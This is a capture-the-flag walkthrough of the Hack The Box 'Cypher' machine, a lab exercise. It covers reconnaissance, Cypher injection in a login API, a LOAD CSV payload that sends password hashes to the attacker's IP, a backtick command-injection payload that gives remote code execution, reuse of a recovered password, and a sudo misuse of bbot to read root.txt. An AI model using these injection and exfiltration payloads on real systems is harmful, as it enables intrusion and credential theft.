---
title: 'HTB-Cypher'
published: 2025-07-12
draft: false
toc: true
tags: ["CypherInjection"]
---

```
Scope:
10.10.11.57
```

# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -vvvv -p- -T5 --min-rate=5000 -Pn cypher.htb

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: GRAPH ASM
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80/TCP - HTTP

![](attachments/a468dcbd4033f89516c4f4d1a9a726f4.png)

I went ahead and ran `gobuster` in the background.

I tried logging in with `admin - admin`:

![](attachments/66a37c31791cc208fb806f1c9b5b9444.png)

In `caido` I noticed that the login request went through the `/api` endpoint:

![](attachments/f8b4b05275c242ca7307cae4a0eae9b8.png)

In the meantime `gobuster` finished scanning:

![](attachments/159ab161a4be678a6b4aa828cde3794f.png)

I noticed some interesting endpoints, I started off with `/testing`:

![](attachments/6d0e034e4b0cea345c57eeabacbddc72.png)

I downloaded and unpacked the `java` archive:

![](attachments/3d9c4b7a39e891d8ff0a3b0370581c98.png)

I was able to find some versions:

![](attachments/0323f00bb7b08034590fddd5a3d8ae63.png)

Might come in handy.

![](attachments/b0d3a60d2af81eb86403facbd484a0dd.png)

Nothing really useful here either.

### Cypher Injection

I tried fiddling around with the parameters, thinking that there might be a `SQLi`, but instead I found something new:

![](attachments/07ba8e9da5e4a5f96d7f356780e4fe15.png)

I looked this error up:

![](attachments/0d5d8b42140f3cdb687c6ae050729230.png)

I'd not heard of **Cypher Injection** beforehand so this was interesting:

![](attachments/593d958a2f32f2e450dbdc02bae91497.png)

Scrolling down I find:

![](attachments/4e93a90db70eddbeab6d20ddcc18fe27.png)

Combining this with what we find in the error we can form a payload as follows:

![](attachments/f77afd0ac99762bec0ad835dffc01ddc.png)

```cypher
' OR 1=1 LOAD CSV FROM 'http://10.10.14.17/test='+h.value AS y RETURN ''//
```

![](attachments/10052d72dac3badcb733e0e2797f8b30.png)

![](attachments/9ab518c003141f856bac29d5fc281168.png)

#### John - FAIL

![](attachments/2df97889be2259924d5d0b72ded0d9b2.png)

Unfortunately I cannot crack it:

![](attachments/5e48d24d9b7a3e5a4abcde0aa108f52d.png)

# Foothold
## Cypher Injection -> RCE

Using the **Cypher Injection** vulnerability I started testing for **SSRF**:

![](attachments/d10107407053f64e2b94d19671eaeba4.png)

![](attachments/fc333695ee1638fadae35186fb59ff13.png)

I should now be able to tweak it in such a way that I could get a reverse shell out of it.

Using `backticks` I found out that I could inject and execute commands such as `whoami` and `id`:

```Cypher
{
  "username": "admin' RETURN h.value AS hash UNION CALL custom.getUrlStatusCode(\"http://10.10.14.17/`id`\") YIELD statusCode AS hash RETURN hash; //",
  "password": "admin"
}
```

![](attachments/8c62701d1e0b8f3bd8bec32f5a0a1ca0.png)

Knowing that I had full RCE I could now issue a reverse shell command:

![](attachments/313f88494623376033699670aa02706f.png)

![](attachments/d3b0702e63bdd9bb5e7606e28ae39a17.png)

Now that I had a shell I started enumerating the target

![](attachments/b23768fcb379ec36b8269262ad4a2a10.png)

Going into the `~` directory I found this:

![](attachments/06b8fad02a91706a42e917a72eb68535.png)

```
cU4btyib.20xtCMCXkBmerhK
```

### Hydra - Password Spray

A quick check at password respraying showed me that this password was reused by *graphasm* for `ssh`:

![](attachments/fca18f8f0264b3d67d15f257a5e6cda2.png)

## Lateral Movement

![](attachments/a8283b0c0d184c5f14bbe430fb0da6f7.png)

### user.txt

![](attachments/64c2731d701095d53882846285ca3745.png)

# Privilege Escalation
## Enumeration

![](attachments/4c6cf8dee6e88f45032b612758c9c340.png)

I ran the binary and saw this:

![](attachments/f5c4b1d269bb74859a1f2aaa7afcb923.png)

Combining it together with the `--debug` we can run the following command and get `root.txt`:

```bash
sudo /usr/local/bin/bbot -cy /root/root.txt --debug
```

![](attachments/c4d4f8b5859d3ba70d635bf9e9f522a2.png)

### root.txt

![](attachments/65ab193ce008bada1e345f73a51b59c6.png)

![](attachments/b827720106a867b3d1bc8922c7f41278.png)

---